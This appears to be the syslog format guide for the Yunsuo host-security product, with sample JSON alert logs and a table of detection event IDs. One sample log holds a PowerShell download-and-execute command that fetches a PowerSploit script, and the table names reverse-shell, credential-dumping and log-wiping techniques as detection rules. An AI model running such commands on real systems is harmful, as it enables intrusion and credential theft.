@@ -1,0 +1,2126 @@
+云锁 SYSLOG 说明文档 V1.0
+修订记录
+状态说明：C-创建，A-增加，M-修改，D-删除
+1 日志样例
+Event_log  格式采用统一的 Json 格式传输，不同 log 通过 EventUuid(eventUui 为 16 进制字符串，eventId 为 10 进制)进行区分，每一条 log 所包含的字段不完全相同，可能存在上传log 格式不统一情况。只需根据字段实际含义按需解析即可。
+1.1 样例一：
+{
+"accuracy":2,
+"action":{
+"html":"您的服务器<span class='innerIp'>192.168.119.226</span> 存在潜藏的                       后                       门                       风险 <span class='file'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershe ll.exe</span>",
+"text":"  您 的 服 务 器  192.168.119.226   存 在 潜 藏 的 后  门 风 险C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+},
+"alarmMsg":"",  "attackIpFlag":1, "backdoor":{
+"file":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "fileAuth":"32",
+"fileCreateTime":1247528947000,
+"fileGroup":"NT SERVICE",
+"fileHash2":"a8fdba9df15e41b6f5c69c79f66a26a9d48e174f9e7018a371600b 866867dab8",
+"fileMd5":"852d67a27e454bd389fa7f02a8cbe23f",
+"fileModifyTime":1247535560000,
+"fileSize":"462.50",
+"fileType":"exe",
+"fileUseTime":1247528947000,
+"fileUser":"TrustedInstaller",
+"judgeFrom":1 },
+"bannedStatus":0,
+"categoryName":"威胁感知事件", "categoryUuid":8,
+"day":"2021-09-24", "dealStatus":0,
+"description":"发现进程运行可疑命令行，可能为后门行为。请及时研判处置。", "eventId":2162689,
+"eventUuid":"00210001",
+"groupName":"恶意程序",
+"hour":13,
+"innerIp":"192.168.119.226",
+"ip":"192.168.119.226",
+"ipAddress":"局域网",
+"levelDesc":"高危",
+"localTimestamp":1632461785000, "logType":0,
+"logo":"yunsuo", "machine":{
+"currentPage":1,
+"extranetIp":"192.168.119.226",
+"installTime":1632390554000,
+"intranetIp":"192.168.119.226",
+"ipv4":"192.168.119.226",
+"ipv6":"fe80:00:00:00:f5a8:d628:f340:d8fc",
+"machineName":"WIN-R73OIQ3AJE8",
+"maxResults":10,
+"onlineStatus":1,
+"operatingSystem":"Microsoft Windows Server 2008 R2 Standard Edition 6 4-bit",
+"osType":0,
+"uuid":"4697f176cead2241f02e8b22fe7835dd" },
+"machineUuid":"4697f176cead2241f02e8b22fe7835dd", "minute":816,
+"object":{
+"cmdline":"powershell  -nop -c \"iex(New-
+Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerS hellMafia/PowerSploit/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/CodeExecuti on/Invoke-WmiCommand.ps1')\"",
+"domain":"",
+"ip":"192.168.119.226",
+"path":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.ex e",
+"pid":"85460",
+"process":"powershell.exe",
+"user":"TrustedInstaller" },
+"operation":"create_proc",  "operationDesc":"创建进程", "outerIp":"192.168.119.226", "primarySource":"威胁监测",
+"processingMethod":"文件类型", "risk":0,
+"ruleInfo":{
+"backdoorType":10,
+"backdoorTypeName":"可疑进程参数",
+"ruleDesc":"检测到疑似利用 powershell 运行后门",
+"ruleId":15000,
+"ruleLevel":3,
+"ruleName":"疑似利用 PowerShell 运行后门" },
+"score":30,
+"secondarySource":"后门检测", "source":1,
+"sourceDesc":" 内置规则", "sourceIpAddress":{
+"city":"",
+"country":"局域网",
+"ip":"192.168.119.226",
+"region":"",
+"type":"局域网-0"
+},
+"standardTimestamp":1632461786852, "subject":{
+"path":"C:\\Windows\\System32\\cmd.exe",
+"pcmd":"C:\\Windows\\System32\\cmd.exe",
+"pid":"77232",
+"process":"cmd.exe",
+"user":"Administrator" },
+"threatSource":"威胁监测>后门检测", "threatType":"恶意程序",
+"treePath":"explorer.exe(3060)>cmd.exe(77232)>powershell.exe(85460)", "typeName":"后门程序（命令行监控）",
+"victimIpFlag":1 }
+1.2 样例二：
+{
+"action":{
+"html":"                                                      进                              程
+<span class='process'>C:\\Windows\\System32\\svchost.exe</span> 对 <span clas s='dst'>C:\\Windows\\System32\\lsass.exe</span>     进   行      。   来   源   ： <span class='source'> 进程操作监控</span>",
+"text":"                                                           进                                程
+C:\\Windows\\System32\\svchost.exe 对 C:\\Windows\\System32\\lsass.exe 进行 。来源：进程操作监控"
+},
+"alarmMsg":"",
+"attackIpFlag":2,
+"bannedStatus":0,
+"categoryName":"进程操作日志", "categoryUuid":2,
+"day":"2021-09-24", "dealStatus":0,
+"description":"terminate,create_thread,set,operation,read,write,dup_handle,defa ult,query,suspend",
+"eventId":0,
+"eventUuid":"00000000",
+"groupName":"进程操作",
+"hour":14,
+"innerIp":"192.168.119.136",
+"levelDesc":"低危",
+"localTimestamp":1632465016000, "logType":0,
+"logo":"yunsuo", "machine":{
+"currentPage":1,
+"extranetIp":"192.168.119.136",
+"installTime":1630981411000,
+"intranetIp":"192.168.119.136",
+"ipv4":"192.168.119.136",
+"machineName":"WIN-R73OIQ3AJE8",
+"maxResults":10,
+"onlineStatus":1,
+"operatingSystem":"Microsoft Windows Server 2008 R2 Standard Edition 6 4-bit",
+"osType":0,
+"uuid":"b541de9a9d037a56242c0069d3f8e7c2" },
+"machineUuid":"b541de9a9d037a56242c0069d3f8e7c2", "minute":870,
+"object":{
+"proc":"C:\\Windows\\System32\\lsass.exe" },
+"operation":"proc_operate", "operationDesc":"进程操作",
+"operationExtra":"terminate,create_thread,set,operation,read,write,dup_handle,d
+efault,query,suspend",
+"outerIp":"192.168.119.136", "phase":0,
+"phaseDesc":"其他", "result":1,
+"risk":0,   "score":0,
+"serviceId":"C:\\Windows\\System32\\svchost.exe:*", "source":1,
+"sourceDesc":" 内置规则",
+"standardTimestamp":1632465020000, "subject":{
+"bVerify":"yes",
+"company":"Microsoft Corporation",
+"pid":"856",
+"procHash":"c78655bc80301d76ed4fef1c1ea40a7d",
+"procUuid":"f930c95feb42b823d6f410fdebe0f418",
+"process":"C:\\Windows\\System32\\svchost.exe",
+"type":"kernel",
+"user":"NT AUTHORITY\\SYSTEM" },
+"treePath":"wininit.exe(NT AUTHORITY\\SYSTEM)(408)|services.exe(NT AUTHORI TY\\SYSTEM)(504)|svchost.exe(NT AUTHORITY\\SYSTEM)(856)",
+"typeName":"进程操作", "ucrc":2296845656,
+"victimIpFlag":1
+}
+2 事件列表
+说明：EventLog 唯一标识，通过该 eventUuid 区分每条 EventLog 的类型。(eventId 为 10进制，eventUuid 为 16 进制字符串)
+上方表格列出当前展示的事件所用 ID 及事件名称。
+3 字段说明
+3.1 事件基础信息相关字段
+基础字段主要包含事件相关的一下基础信息如事件准确度，攻击类型，处理建议，描述，级别等等
+3.1.1 字段列表
+3.1.2 日志样例
+3.2 告警信息相关字段
+主要包含事件的告警详情详情信息
+3.2.1 字段列表
+3.2.2 日志样例
+3.3 攻击源详情相关字段
+描述攻击源 IP 信息
+3.3.1 字段列表
+3.3.2 日志样例
+3.4 服务器基础信息相关字段
+描述受害服务器相关基础信息
+3.4.1 字段列表
+3.4.2 日志样例
+3.5 访问主体相关字段
+访问主体指数据获资源的访问者包括 IP，进程等。这部分日志信息用于描述事件的发起者详情，根据事件或日志类型不同，内部字段也有所不同
+3.5.1 字段列表
+3.5.2 日志样例
+3.6 操作信息相关字段
+描述访问主体对数据或资源进行的访问动作。
+Agent 上传日志的 Operation：
+sql_inject：防 SQL 注入，xss_inject：防 XSS 攻击，application_val：防应用程序漏洞， deny_overflow：防溢出，file_parse_vul：文件解析漏洞，malform_file：畸形文件，
+method_protect：防非法请求，file_download：防文件下载，background：后台防护，
+active_defense：网页浏览实时防护，sensitive：敏感词过滤，deny_leech：防盗链， multi_down：防多线程下载，http_key：HTTP 请求防护
+登录日志的 Operation：
+system_login：系统本地登录，rdp_crack：远程桌面暴力破解，ssh_crack：SSH 暴力破解可疑访问的 Operation：
+data_collection：可疑访问
+其它 Operation：
+sql_query：可疑 SQL 语句，execute_command：执行命令，unserialize：反序列化，
+create：创建，read：读取，connect：连接，file_include：文件包含，upload：上传，
+3.6.1 字段列表
+3.6.2 日志样例
+3.7 被访问客体相关字段
+客体指被访问的文件，进程，IP，域名，端口，命令等等资源，客体字段主要描述被访问资源细节，主体+操作+客体形成完整的一个事件详情。根据事件类型不同，客体字段也有所不同
+3.7.1 字段列表
+3.7.2 日志样例
+3.8 ATT&CK 相关字段
+描述该事件与 ATT&CK 矩阵的对应关系（暂时仅支持 EDR 类型事件）
+3.8.1 字段列表
+3.8.2 日志样例
+	"at tId":"T1036",           
+3.9 规则详情扩展字段
+某些事件会具有多条规则（如无文件攻击、后门检测、OOB 攻击等），规则详情扩展主要是为了描述这些具体规则的相关内容。
+3.9.1 字段列表
+3.9.2 日志样例
+3.10 后门文件详情扩展字段
+对后门文件的详细描述，主要存在于后门检测事件，可疑文件上传事件等。
+3.10.1     字段列表
+3.10.2     日志样例
+3.11 无文件攻击扩展字段
+对无文件件攻击详情进行详细描述。根据无文件攻击类型不同字段内容有所不同
+3.11.1     字段列表
+3.11.2     日志样例
+3.12  RCE 远程命令执行详情字段
+用于描述 RCE 事件详情及具体规则
+3.12.1     字段列表
+3.12.2     日志样例
+3.13 Web 攻击事件扩展字段
+通过 WAF 插件或 RASP 插件产生的安全事件会包含 HTTP 扩展字段，如 SQL 注入,struts2 漏洞利用，反序列化漏洞利用等。
+3.13.1     字段列表
+3.13.2     日志样例
+3.14 Webshell 详情扩展字段
+描述 webshell 文件相关详情，根据 webshell 检测来源不同，字段有所不同。用于发现webshell事件
+3.14.1     字段列表
+3.14.2     日志样例
+3.15 登录详情扩展字段
+描述用户登录相关信息，主要用于如暴力破解，异常登录等事件中。
+3.15.1     字段列表
+3.15.2     日志样例
+
+=== TABLE ===
+版本 | 状态 | 章节 | 修改内容 | 修改人 | 修改时间
+V 1.0 | C |  |  | 阮迪 | 2021.9.30
+V 1.1 | M | 2 | 补充新的事件 | 田强 | 2023.4.19
+
+=== TABLE ===
+eventUuid | eventId | typename
+00000000 | 0 | 虚拟补丁
+00000000 | 0 | WEB 溢出攻击
+00000000 | 0 | WEB 应用扫描
+00000000 | 0 | 下载特定类型文件
+00000000 | 0 | 文件名解析漏洞
+00000000 | 0 | HTTP 请求异常
+00000000 | 0 | 浏览畸形文件
+00000000 | 0 | 请求类型控制
+00000000 | 0 | SQL 注入攻击
+
+=== TABLE ===
+00000000 | 0 | URL 控制
+00000000 | 0 | 跨站 XSS 攻击
+00000000 | 0 | X-Forwarded-For 防护
+00000002 | 2 | 更改系统可执行文件
+00000003 | 3 | 对外服务进程更改 Linux 系统配置文件
+00000004 | 4 | 更改系统登录认证相关文件
+00000005 | 5 | 更改系统引导文件
+00000006 | 6 | 非系统进程创建 autorun.inf 文件
+00000007 | 7 | 非系统进程创建 Usp10.dll 文件
+00000008 | 8 | 添加系统启动项
+00000009 | 9 | 对外服务进程添加定时任务
+0000000a | 10 | 对外服务进程修改账户信息
+0000000c | 12 | 进程自我复制
+0000000d | 13 | 对外服务进程修改系统日志
+0000000f | 15 | 对外服务进程执行危险命令
+00000010 | 16 | 信任进程加载无数字签名 DLL
+00000011 | 17 | 非系统进程创建 lpk.dll 文件
+00000012 | 18 | 非系统进程在系统目录下创建可执行文件
+00000014 | 20 | 对外服务进程创建危险扩展名文件
+00000015 | 21 | 非信任进程在非正常目录下创建可执行文件
+00000016 | 22 | 对外服务进程执行非正常扩展名可执行文件
+00000017 | 23 | 粘连键命令被篡改
+00000018 | 24 | 加载无数字签名驱动
+00000019 | 25 | 非系统进程尝试劫持系统引导过程
+0000001a | 26 | 非系统进程尝试劫持系统登录过程
+0000001b | 27 | 非系统进程尝试劫持系统启动过程
+0000001c | 28 | 非系统进程尝试劫持 EXE 执行过程
+0000001d | 29 | 非系统进程尝试劫持自启动过程可被禁止
+0000001e | 30 | 非系统进程尝试劫持自启动过程可疑
+0000001f | 31 | 非系统进程通过组策略劫持开机过程
+00000020 | 32 | 非系统进程通过组策略劫持关机过程
+00000021 | 33 | 非系统进程修改系统服务
+00000022 | 34 | 非系统进程修改 LSP
+00000023 | 35 | 非系统进程修改 MSI 提权
+00000024 | 36 | 非系统进程通过修改屏保程序劫持启动过程
+00000026 | 38 | 对外服务进程创建危险的定时任务脚本
+00000027 | 39 | 非信任进程试图修改内核选项
+00000028 | 40 | 创建危险的可执行文件
+00000029 | 41 | 在系统二进制目录下面创建隐藏文件
+0000002a | 42 | 创建密码文件的符号链接
+0000002b | 43 | 在/dev/shm/下创建可执行文件
+0000002d | 45 | 对外服务进程编译文件
+00000031 | 49 | 对外服务进程修改 SSH 认证文件
+
+=== TABLE ===
+00000033 | 51 | 进程进行 DNS 查询
+00000034 | 52 | shell 命令审计
+00000035 | 53 | 利用系统漏洞提升权限
+00020001 | 131073 | 应用存在 SQL 注入漏洞
+00020002 | 131074 | 应用存在 Struts2 漏洞
+00020003 | 131075 | 应用存在 Java 反序列化漏洞
+00020004 | 131076 | 应用存在文件包含漏洞
+00020005 | 131077 | 应用存在代码执行漏洞
+00020006 | 131078 | 应用存在上传文件漏洞
+00020007 | 131079 | Redis 漏洞
+00020008 | 131080 | 应用存在 PHP 反序列化漏洞
+0002000e | 131086 | SSRF 漏洞
+00020010 | 131088 | XXE 实体注入漏洞
+00020011 | 131089 | 应用存在命令执行漏洞
+00020012 | 131090 | 应用存在任意文件读取漏洞
+00020013 | 131091 | 系统存在缓冲区溢出漏洞
+00020014 | 131092 | RCE 利用
+00020015 | 131093 | 可疑文件写入
+00030000 | 196608 | 发现 Webshell
+00050002 | 327682 | 尝试加载无签名驱动文件
+00060001 | 393217 | 发现病毒
+000b0000 | 720896 | 服务器离线
+000b0001 | 720897 | 服务器 agent 卸载
+000e0000 | 917504 | 服务器账户异常登录
+00100005 | 1048581 | 远程登录暴力破解
+00100006 | 1048582 | SSH 登录暴力破解
+00110000 | 1114112 | 系统端口扫描
+00130001 | 1245185 | 文件异常
+00140001 | 1310721 | 用户异常
+00180001 | 1572865 | U 盘插拔
+001b0001 | 1769473 | 微蜜罐
+001d0001 | 1900545 | LSASS 进程加载无数字签名的 dll
+001d0003 | 1900547 | 代理隧道
+001d0005 | 1900549 | OOB 带外攻击
+001e0001 | 1966081 | 非白名单 IP 利用T3 协议
+001e0002 | 1966082 | 非白名单 IP 利用 IIOP 协议
+00210001 | 2162689 | 后门程序（命令行监控）
+00210002 | 2162690 | 后门程序（进程扫描）
+00210003 | 2162691 | 后门程序（文件扫描）
+00210004 | 2162692 | 后门程序（文件监控）
+00210005 | 2162693 | 后门程序（进程监控）
+00210009 | 2162697 | 后门程序（计划任务）
+00220001 | 2228225 | 无文件攻击（命令执行）
+
+=== TABLE ===
+00220002 | 2228226 | 无文件攻击（文件下载）
+00220003 | 2228227 | 无文件攻击（脚本执行）
+00220004 | 2228228 | 无文件攻击（SQL 执行）
+00220005 | 2228229 | 无文件攻击（文件创建）
+00220006 | 2228230 | 无文件攻击（数据执行）
+00220007 | 2228231 | 无文件攻击（非法外连）
+00220008 | 2228232 | 无文件攻击（敏感调用）
+00220009 | 2228233 | 无文件攻击（敏感堆栈调用）
+00290001 | 2686977 | 禁止 regsvr32.exe 下载远程文件
+00290002 | 2686978 | 禁止 certutil 下载可执行文件
+00290003 | 2686979 | 禁止 powershell 连接互联网 IP
+00290004 | 2686980 | 禁止 powershell 下载可执行文件
+00290005 | 2686981 | 禁止 js/vbs 脚本解释器下载可执行文件
+00290006 | 2686982 | 禁止 rundll32 下载远程文件
+00290007 | 2686983 | 禁止 msiexec 下载远程文件
+00290008 | 2686984 | 禁止利用 wmic 远程执行命令
+00290009 | 2686985 | 禁止利用类 psexec 远程执行命令
+0029000b | 2686987 | 禁止利用 base64 创建webshell
+0029000c | 2686988 | 禁止利用 bash 创建webshell
+0029000d | 2686989 | 禁止利用 base64 下载可执行文件
+0029000e | 2686990 | 禁止利用下载工具从互联网下载可执行文件
+0029000f | 2686991 | 禁止对外服务进程下载可执行文件
+00290010 | 2686992 | 禁止 Linux 临时目录下运行 golang 程序
+00290011 | 2686993 | 禁止反射注入 DLL
+00290012 | 2686994 | 禁止利用代理工具进行内外网穿透
+00290013 | 2686995 | 禁止访问勒索相关域名
+00290014 | 2686996 | 禁止 Linux 临时目录下运行 UPX 程序
+00290015 | 2686997 | 禁止 mshta 下载远程文件
+00290016 | 2686998 | 禁止 bitsadmin 下载文件
+00f40001 | 15990785 | 服务存在可疑命令执行
+00f40002 | 15990786 | 服务存在可疑文件创建
+00f40003 | 15990787 | 服务存在可疑网络外连
+00f50001 | 16056321 | 运行非白名单内进程
+00f60001 | 16121857 | 本地提权
+00f60002 | 16121858 | 反弹 Shell
+00f60003 | 16121859 | 发现 web 后门
+00f80001 | 16252929 | 内网暴露
+00f80002 | 16252930 | 外网暴露
+00f90001 | 16318465 | 外连网络
+00fb0001 | 16449537 | 发现病毒
+00fb0002 | 16449538 | 挖矿程序
+00fb0003 | 16449539 | 蠕虫病毒
+00fb0004 | 16449540 | 勒索病毒
+
+=== TABLE ===
+00fb0005 | 16449541 | 木马程序
+00fb0006 | 16449542 | 木马程序
+00fb0007 | 16449543 | DDoS 木马
+00fb0008 | 16449544 | 后门程序
+00fb0009 | 16449545 | 病毒型感染
+00fb000a | 16449546 | 恶意程序
+00fb000b | 16449547 | 二进制文件病毒
+00fb000c | 16449548 | 脚本病毒
+00fb000d | 16449549 | 灰色软件
+00fb000e | 16449550 | ShellCode
+00fb000f | 16449551 | 广告病毒
+00fb0010 | 16449552 | 疑似病毒
+00fb0011 | 16449553 | 系统病毒
+00fb0012 | 16449554 | 系统病毒
+00fc0001 | 16515073 | 反连异常域名
+00fc0002 | 16515074 | 反连异常 IP
+00F20001 | 15859713 | powershell 上传二进制文件
+00F20002 | 15859714 | powershell 下载文件
+00F20003 | 15859715 | powershell 下载文件 2
+00F20004 | 15859716 | powershell 执行加密脚本
+00F20005 | 15859717 | powershell 隐蔽执行脚本
+00F20007 | 15859719 | bash 反弹 shell
+00F20008 | 15859720 | Php 反弹 shell
+00F20009 | 15859721 | Perl 反弹 shell
+00F2000A | 15859722 | NC 反弹 shell
+00F2000B | 15859723 | Awk 反弹 shell
+00F2000C | 15859724 | Ruby 反弹 shell
+00F2000D | 15859725 | Lua 反弹 shell
+00F2000E | 15859726 | Sudo 提权漏洞利用(CVE-2019-14287 )
+00F2000F | 15859727 | 添加 root 账户
+00F20010 | 15859728 | bitsadmin 下载文件
+00F20011 | 15859729 | ieexec.exe 执行文件
+00F20012 | 15859730 | certutil 下载文件
+00F20013 | 15859731 | certutil 解码文件
+00F20014 | 15859732 | perl 一句话下载文件
+00F20015 | 15859733 | python 一句话下载文件
+00F20016 | 15859734 | python 一句话后门
+00F20017 | 15859735 | ftp 执行命令
+00F20018 | 15859736 | 利用 ftp 命令上传或下载文件
+00F20019 | 15859737 | 利用脚本上传二进制文件
+00F2001A | 15859738 | 利用脚本上传 web 脚本
+00F2001B | 15859739 | CMSTP 执行安装脚本
+00F2001C | 15859740 | 利用 InstallUtil 执行 dotnet 程序
+
+=== TABLE ===
+00F2001D | 15859741 | 利用 SessionEnv 服务执行恶意代码
+00F2001E | 15859742 | 添加控制面板项
+00F2001F | 15859743 | 利用 control 执行命令
+00F20020 | 15859744 | 利用 mshta 执行命令
+00F20021 | 15859745 | 利用 mshta 执行远程脚本
+00F20022 | 15859746 | 利用 mshta 执行一句话脚本
+00F20023 | 15859747 | 利用 odbcconf 代理执行 dll
+00F20024 | 15859748 | 利用 xwizard.exe 代理执行 dll
+00F20026 | 15859750 | 利用 xwizard.exe 执行 COM 对象
+00F2002A | 15859754 | 导入注册表文件
+00F2002B | 15859755 | DNS 服务器远程加载 Dll
+00F2002C | 15859756 | msiexec 执行远程程序
+00F2002D | 15859757 | 利用 msiexec 代理执行 dll
+00F2002E | 15859758 | 域共享目录下创建二进制文件
+00F2002F | 15859759 | 利用 Regsvcs/Regasm 注册 dotnet COM 对象
+00F20030 | 15859760 | 利用 IE 自带 ExtExport 程序代理执行 dll
+00F20031 | 15859761 | powershell 编译 dotnet 文件
+00F20033 | 15859763 | 利用 SyncAppvPublishingServer 命令执行脚本
+00F20034 | 15859764 | 利用 SyncAppvPublishingServer 脚本执行 powershell 脚本
+00F20035 | 15859765 | 利用脚本执行 powershell
+00F20036 | 15859766 | 利用 ie4uinit 执行安装脚本
+00F20037 | 15859767 | 利用 regsvr32 命令执行脚本
+00F20038 | 15859768 | powershell 利用 xsl 转换类执行脚本
+00F20039 | 15859769 | 利用 regsvr32 命令执行远程脚本
+00F2003A | 15859770 | 利用 IKEEXT 服务执行恶意代码
+00F2003B | 15859771 | 利用 pubprn.vbs 执行脚本
+00F2003C | 15859772 | 无数字签名进程执行 rundll32
+00F2003D | 15859773 | 利用 netsh 的 Helper DLL 执行恶意代码
+00F2003E | 15859774 | 利用 netsh 的 Helper DLL 执行恶意代码 2
+00F2003F | 15859775 | 利用 rundll32 执行一句话脚本
+00F20040 | 15859776 | 利用 rundll32 执行安装脚本
+00F20041 | 15859777 | 利用 rundll32 执行命令
+00F20042 | 15859778 | 无数字签名进程执行 InfDefaultInstall
+00F20043 | 15859779 | 利用注册 cimprovider 的 dll 执行代码
+00F20044 | 15859780 | 利用 chm 文件执行命令
+00F20045 | 15859781 | 利用系统 mavinject 命令远程注入 dll
+00F20046 | 15859782 | 利用系统 WMI 服务执行命令
+00F20047 | 15859783 | 利用 wmic 命令执行xsl 脚本
+00F20048 | 15859784 | 利用系统 AppSwitcher 执行命令
+00F2004A | 15859786 | 利用系统 PresentationHost 执行命令
+00F2004B | 15859787 | 利用系统 ScriptRunner 执行命令
+00F2004C | 15859788 | 利用 dotnet JScript 编译器生成二进制文件
+00F2004D | 15859789 | 利用系统 gpscript 执行命令
+
+=== TABLE ===
+00F2004E | 15859790 | 尝试编译 C#文件
+00F20050 | 15859792 | 访问远程 ClickOnce 类型应用
+00F20051 | 15859793 | 利用系统 forfiles 执行命令
+00F20052 | 15859794 | 利用系统 pcalua 执行命令
+00F20053 | 15859795 | 利用系统 diskshadow 执行命令
+00F20054 | 15859796 | 利用 sqlserver 自带 sqlps 执行命令
+00F20055 | 15859797 | 异常进程名
+00F20056 | 15859798 | winrm 服务上传二进制文件
+00F20057 | 15859799 | 利用系统 winrm 服务执行命令
+00F20058 | 15859800 | 异常进程启动
+00F20059 | 15859801 | 永恒之蓝
+00F2005A | 15859802 | 疑似利用漏洞创建 webshell 行为
+00F2005B | 15859803 | 挖矿程序
+00F2005C | 15859804 | 反连异常域名
+00F2005D | 15859805 | 可疑进程外连
+00F2005E | 15859806 | 对系统认证进程进行远程代码注入
+00F2005F | 15859807 | 读取系统认证进程内存数据
+00F20060 | 15859808 | 安装密码过滤插件
+00F20061 | 15859809 | 安装 SSP 插件
+00F20062 | 15859810 | 导出注册表 SAM 键
+00F20063 | 15859811 | Volume Shadow 拷贝系统账户相关文件
+00F20066 | 15859814 | 安装 Lsa 认证插件
+00F20067 | 15859815 | 添加 windows 系统账户
+00F20068 | 15859816 | 添加 windows 系统账户到管理员组
+00F20069 | 15859817 | 添加 linux 系统账户
+00F2006A | 15859818 | 查询 windows 系统用户的 SID
+00F2006B | 15859819 | 查询 windows 域管理员用户
+00F2006C | 15859820 | 查询 windows 域内用户
+00F2006D | 15859821 | 查询 windows 用户组
+00F2006F | 15859823 | 执行隐藏文件
+00F20070 | 15859824 | 执行 Windows 隐藏可执行文件命令
+00F20074 | 15859828 | 执行设置 setuid 标志命令
+00F20075 | 15859829 | 利用计划任务下载后门程序
+00F20076 | 15859830 | 利用计划任务执行远程脚本
+00F20078 | 15859832 | 修改系统 preload 文件
+00F2007A | 15859834 | 删除 history 文件
+00F2007C | 15859836 | 设置文件权限为 everyone 所有权限
+00F2007F | 15859839 | base64 加密命令行
+00F20080 | 15859840 | Sudo 缓冲区/栈溢出本地提权漏洞(CVE-2021-3156)
+00F20081 | 15859841 | 利用 vipw 修改 shadow 文件
+00F20082 | 15859842 | Perl 反弹 shell2
+00F20083 | 15859843 | 利用 wget 安装后门的连贯操作
+00F20084 | 15859844 | 利用 curl 安装后门的连贯操作
+
+=== TABLE ===
+00F20085 | 15859845 | 利用 ssocks 建立 socks 反向代理
+00F20086 | 15859846 | 利用 vigr 修改 shadow 文件
+00F20087 | 15859847 | 利用 rcsocks 建立 socks 反向代理
+00F20088 | 15859848 | 利用 portmap 端口转发
+00F20089 | 15859849 | 利用 hydra 进行爆破
+00F2008A | 15859850 | ssh 任意密码登录后门
+00F2008B | 15859851 | 使用 logtamper 修改 linux 日志
+00F2008C | 15859852 | 使用代理软件 lcx
+00F2008D | 15859853 | node 反弹 shell
+00F2008E | 15859854 | Ruby 反弹 shell2
+00F2008F | 15859855 | nmap 端口扫描
+00F20090 | 15859856 | 使用 arpspoof 进行 arp 欺骗
+00F20091 | 15859857 | 使用 arpsniffer 进行 arp 欺骗
+00F20092 | 15859858 | 查看系统数据库 passwd 相关记录
+00F20093 | 15859859 | 使用 reGeorg http 代理转发
+00F20094 | 15859860 | 使用 arp-dsniff 进行 arp 欺骗
+00F20095 | 15859861 | 使用 wtmpclean 清除系统中wtmp 记录
+00F20096 | 15859862 | 使用代理软件 frp
+00F20097 | 15859863 | 使用代理软件 ngrok
+00F20098 | 15859864 | 使用代理软件 tgcd
+00F20099 | 15859865 | 使用代理软件 natbypass
+00F2009A | 15859866 | 使用代理软件 iox
+00F2009B | 15859867 | 复制系统关键命令
+00F2009C | 15859868 | 使用 ettercap 嗅探
+00F2009D | 15859869 | 查看或修改 ssh 登录公钥
+00F2009E | 15859870 | 查看或修改 mysql 历史记录
+00F2009F | 15859871 | wipe 删除文件或目录
+00F200A0 | 15859872 | Openssl 反弹 shell
+00F200A1 | 15859873 | Telnet 反弹 shell
+00F200A2 | 15859874 | Zsh 反弹 shell
+00F200A3 | 15859875 | ssh 反弹 shell
+00F200A4 | 15859876 | 利用 cscript 执行远程下载命令
+00F200A5 | 15859877 | 利用 wscript 执行远程下载命令
+00F200A6 | 15859878 | 利用 rundll32 执行远程下载命令
+00F200A7 | 15859879 | SyncAppvPublishingServer 执行远程下载命令
+00F200A8 | 15859880 | msxsl 执行远程下载命令
+00F200A9 | 15859881 | NC.exe 反弹 shell
+00F200AA | 15859882 | 利用 powershell 执行远程下载命令
+00F200AB | 15859883 | 使用 procdump 工具 dump lsass.exe 进程内存
+00F200AC | 15859884 | 使用 procdump 工具 dump 系统进程内存
+00F200AD | 15859885 | 使用 PsExec 远程执行系统命令
+00F200AE | 15859886 | 使用 PsExec 远程执行系统命令 2
+00F200AF | 15859887 | 使用 QuarksPwDump 获取用户凭据
+
+=== TABLE ===
+00F200B0 | 15859888 | 使用 NTDSDumpEx 获取用户哈希
+00F200B1 | 15859889 | 使用黑客工具 mimikatz
+00F200B2 | 15859890 | 使用黑客工具 rubeus
+00F200B3 | 15859891 | ssh 实现 socks 代理
+00F200B4 | 15859892 | ssh 实现端口转发
+00F200B5 | 15859893 | 使用 wmic 远程执行命令
+00F200B6 | 15859894 | socat 反弹 shell
+00F200B7 | 15859895 | socat 反弹 shell2
+00F200B8 | 15859896 | 使用 powershell 清理 Windows 事件日志
+00F200B9 | 15859897 | 清理.bash_history 文件内容
+00F200BA | 15859898 | psexec 服务端程序执行系统命令
+00F200BB | 15859899 | spoolsv.exe 执行系统命令
+00F200BC | 15859900 | 双端口反弹 shell
+00F200BD | 15859901 | python 执行恶意命令
+00F200BE | 15859902 | python 执行恶意命令 2
+00F200BF | 15859903 | python 执行恶意命令 3
+00F200C0 | 15859904 | python 切换 uid 为 0
+00F200C1 | 15859905 | powershell 反弹 shell
+00F200C2 | 15859906 | 利用 powershell 执行远程下载命令 2
+00F200C3 | 15859907 | perl 执行远程命令
+00F200C4 | 15859908 | perl 执行远程命令 2
+00F200C5 | 15859909 | 利用 replace 执行远程下载命令
+00F200C6 | 15859910 | 利用 hh 执行远程下载命令
+00F200C7 | 15859911 | 利用 wmic 执行远程下载命令
+00F200C8 | 15859912 | 利用 xwizard 执行远程下载命令
+00F200C9 | 15859913 | 疑似 windows 内网扫描行为
+00F200CA | 15859914 | 使用 Strace 收集登录凭证
+00F200CB | 15859915 | Office 执行系统命令
+00F200CC | 15859916 | ssh 任意密码登录后门 2
+00F200CD | 15859917 | 使用 python 安全工具
+00F200CE | 15859918 | 使用提权脚本工具
+00F200CF | 15859919 | 蚁剑 AntSword 执行命令
+00F200D0 | 15859920 | 查询 windows 系统用户的 SID2
+00F200D1 | 15859921 | Exchange 漏洞利用( CVE-2021-26858 )
+00F200D2 | 15859922 | Exchange 漏洞利用
+00F200D3 | 15859923 | 使用 AdFind 侦查工具
+00F200D4 | 15859924 | Base64 编码过的 PE 头
+00F200D5 | 15859925 | Ruby 执行 Base64 解码
+00F200D6 | 15859926 | 利用 memFd_create 进行无文件攻击
+00F200D7 | 15859927 | 执行/dev/shm/目录下的文件
+00F200D8 | 15859928 | xterm 反弹 shell
+00F200D9 | 15859929 | Exchange ProxyShell 漏洞利用
+00F200DA | 15859930 | Exchange 存在 Webshell 执行命令
+
+=== TABLE ===
+00F200DB | 15859931 | 使用 ADExplorer 工具 dump 域信息
+00F200DC | 15859932 | 使用 ADExplorer 工具 dump 域信息
+00F200DD | 15859933 | 使用 AdFind 侦查工具
+00F200DE | 15859934 | 使用 ntdsutil 命令创建 NTDS 快照
+00F200DF | 15859935 | 设置系统保存明文密码
+00F200E0 | 15859936 | 反连 ToR 代理网络
+00F200E1 | 15859937 | PrintNightmare 本地提权漏洞利用
+00F200E2 | 15859938 | PrintNightmare 漏洞利用
+00F200E3 | 15859939 | 泛微 E-OFFice 文件上传漏洞利用
+00F200E4 | 15859940 | 用友 NC 文件上传漏洞利用
